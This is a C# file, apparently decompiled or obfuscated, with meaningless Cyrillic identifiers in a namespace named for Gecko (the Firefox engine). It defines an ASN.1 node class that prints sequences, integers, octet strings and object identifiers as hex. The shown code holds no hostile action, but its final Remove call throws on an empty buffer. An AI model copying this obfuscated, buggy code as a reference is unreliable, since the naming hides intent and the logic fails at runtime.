using System.Collections.Generic;
using System.Text;

namespace NoiseMe.Drags.App.Data.Gecko
{
	public class нкрпар
	{
		public ггорол ObjectType
		{
			get;
			set;
		}

		public byte[] ObjectData
		{
			get;
			set;
		}

		public int ObjectLength
		{
			get;
			set;
		}

		public List<нкрпар> Objects
		{
			get;
			set;
		}

		public нкрпар()
		{
			Objects = new List<нкрпар>();
		}

		public override string ToString()
		{
			StringBuilder stringBuilder = new StringBuilder();
			StringBuilder stringBuilder2 = new StringBuilder();
			switch (ObjectType)
			{
			case ггорол.Sequence:
				stringBuilder.AppendLine("SEQUENCE {");
				break;
			case ггорол.Integer:
			{
				byte[] objectData = ObjectData;
				foreach (byte b2 in objectData)
				{
					stringBuilder2.AppendFormat("{0:X2}", b2);
				}
				stringBuilder.Append("\tINTEGER ").Append(stringBuilder2).AppendLine();
				break;
			}
			case ггорол.OctetString:
			{
				byte[] objectData = ObjectData;
				foreach (byte b3 in objectData)
				{
					stringBuilder2.AppendFormat("{0:X2}", b3);
				}
				stringBuilder.Append("\tOCTETSTRING ").AppendLine(stringBuilder2.ToString());
				break;
			}
			case ггорол.ObjectIdentifier:
			{
				byte[] objectData = ObjectData;
				foreach (byte b in objectData)
				{
					stringBuilder2.AppendFormat("{0:X2}", b);
				}
				stringBuilder.Append("\tOBJECTIDENTIFIER ").AppendLine(stringBuilder2.ToString());
				break;
			}
			}
			foreach (нкрпар @object in Objects)
			{
				stringBuilder.Append(@object.ToString());
			}
			if (ObjectType == ггорол.Sequence)
			{
				stringBuilder.AppendLine("}");
			}
			stringBuilder2.Remove(0, stringBuilder2.Length - 1);
			return stringBuilder.ToString();
		}
	}
}
